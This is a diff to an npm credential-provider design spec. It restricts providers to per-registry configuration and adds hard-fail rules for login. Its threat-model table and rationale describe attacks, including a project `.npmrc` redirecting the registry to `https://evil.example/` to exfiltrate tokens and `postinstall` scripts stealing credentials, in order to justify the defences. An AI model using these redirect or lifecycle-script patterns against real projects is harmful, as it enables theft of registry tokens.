@@ -188,10 +188,16 @@ The user or global `.npmrc` stores provider identifiers, not shell commands. The
 ordered, comma-separated list of provider ids:
 
 - `//<registryHost>:credentialProvider=<id>[,<id>...]` (per-registry)
-- `@scope:credentialProvider=<id>[,<id>...]` (per-scope)
-- `credentialProvider=<id>[,<id>...]` (global default)
 
-Precedence: per-registry > per-scope > global default.
+Only per-registry configuration is supported. Global default
+(`credentialProvider=<id>`) and per-scope (`@scope:credentialProvider=<id>`)
+forms are intentionally omitted. Rationale: the effective registry URL comes
+from project `.npmrc` (which may be checked into a repo). A global or
+scope-level provider is not bound to any specific host, so a malicious
+project `.npmrc` setting `registry=https://evil.example/` would cause the
+provider to mint a token and npm to send it to an attacker-controlled host.
+Per-registry configuration binds the provider to a specific trusted host,
+eliminating this exfiltration vector by construction.
 
 Only user or global `.npmrc` grants execution trust. All
 `credentialProvider*` keys (`credentialProvider`,
@@ -200,8 +206,12 @@ Only user or global `.npmrc` grants execution trust. All
 
 npm tries providers in the order listed. When a provider returns an `Err`
 with kind `"url-not-supported"`, npm advances to the next provider. If all
-providers return `"url-not-supported"`, npm falls back to legacy auth and
-emits a warning. npm does not cache which provider succeeded for a given
+providers return `"url-not-supported"`:
+- On `get` or `logout`: npm falls back to legacy auth and emits a warning.
+- On `login`: npm hard-fails — no fallback. Falling back would persist a
+  plaintext token to `.npmrc`.
+
+npm does not cache which provider succeeded for a given
 registry; providers are tried in order on every npm command. This
 matches Cargo's credential provider model. Provider-side token caching
 ensures the successful provider returns near-instantly on subsequent
@@ -218,15 +228,12 @@ Example:
 ```ini
 # ~/.npmrc
 
-# Global default — applies to all registries unless overridden
-credentialProvider=@corp/credprovider,@backup/credprovider
-
-# Per-registry — overrides global default for this registry
+# Per-host — provider is bound to this specific host
 //registry.example.com:credentialProvider=@corp/credprovider
 //registry.example.com:credentialProviderAccountHint=user@corp.com
 
-# Per-scope — overrides global default for @corp packages
-@corp:credentialProvider=@corp/credprovider
+# Multiple registries — each with its own provider config
+//pkgs.dev.azure.com/org/_packaging/feed/npm/registry:credentialProvider=@corp/credprovider,@backup/credprovider
 ```
 
 #### Provider Binary Resolution
@@ -541,6 +548,8 @@ Response on success:
   always returns `operation-not-supported` for `login`; falling back would
   persist a plaintext token to `.npmrc`. If a user needs legacy login, they
   must remove the provider configuration first.
+- If all configured providers return `url-not-supported` for `login`,
+  `npm login` must hard-fail — same rationale as above.
 - If a provider is configured but returns `operation-not-supported` for
   `logout`, npm falls back to default logout behavior (removing `.npmrc`
   token entries) and emits a warning.
@@ -574,7 +583,7 @@ On failure, the provider responds with an `Err` object:
 
 | Error kind | Meaning | npm behavior |
 |------------|---------|--------------|
-| `"url-not-supported"` | Provider does not handle this registry. | Skip to next provider in the configured list. |
+| `"url-not-supported"` | Provider does not handle this registry. | Skip to next provider in the configured list. If all providers return this: `get`/`logout` fall back to legacy auth with warning; `login` hard-fails. |
 | `"version-not-supported"` | Provider does not support the declared protocol version. | Hard-fail with actionable guidance (update provider). No retry with lower version. |
 | `"operation-not-supported"` | Provider does not support this request kind. | `get`/`logout`: fall back to legacy auth with warning. `login`: hard-fail — no fallback. |
 | `"other"` | Generic error. | `get`/`logout`: fall back to legacy auth with warning. `login`: hard-fail — no fallback. |
@@ -697,7 +706,7 @@ $ npm ci --no-interactive
 | Timeout manipulation via project `.npmrc` | `credentialProviderTimeoutMs=1` forces timeout to trigger fallback | `credentialProviderTimeoutMs` ignored from project `.npmrc` |
 | Account hint redirection | `credentialProviderAccountHint` redirects to attacker account | `credentialProviderAccountHint` ignored from project `.npmrc` |
 | Credential exfiltration via lifecycle scripts | `postinstall` spawns provider binary or `npm`/`npx` to acquire token | Opt-in install scripts (default in npm 12+) |
-| Token exfiltration via registry redirect | Project `.npmrc` sets `registry=https://evil.example/`; global provider mints a token and npm sends it to the attacker | Providers should return `url-not-supported` for unknown registries. Providers are strongly encouraged to maintain an internal allowlist of trusted registry hosts and reject requests for unrecognized hosts. |
+| Token exfiltration via registry redirect | Project `.npmrc` sets `registry=https://evil.example/`; global provider mints a token and npm sends it to the attacker | Per-registry config only — no global/scope providers. Provider is bound to a specific trusted host by construction. Providers should additionally return `url-not-supported` for unrecognized hosts. |
 | Network interception via project `.npmrc` | Project `.npmrc` sets `https-proxy` or `cafile` to route provider IdP calls through attacker proxy | `network.*` fields sourced from user/global `.npmrc` only; project-level network settings never forwarded to providers |
 
 #### Process memory
